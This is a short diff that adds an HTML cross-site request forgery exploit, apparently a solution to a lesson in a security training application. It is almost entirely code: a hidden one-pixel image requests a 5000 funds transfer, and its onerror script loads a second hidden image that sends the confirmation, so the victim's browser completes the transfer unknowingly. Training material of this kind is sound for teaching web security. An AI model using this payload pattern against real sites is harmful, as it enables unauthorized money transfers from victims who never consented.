@@ -1,0 +1,11 @@
+This exploit uses a second request to confirm the transferFunds of the first request. This is done by calling a script upon error when trying to load the first image.
+
+<img id="attackyou" src="attack?Screen= 1471017872&menu=900&transferFunds=5000" width="1" height="1" onerror="selfConfirmation()">
+
+<img id="attackyou2" width="1" height="1">
+
+<script>
+function selfConfirmation() {
+    document.getElementById("attackyou2").src = "attack?Screen= 1471017872&menu=900&transferFunds=CONFIRM";
+}
+</script>
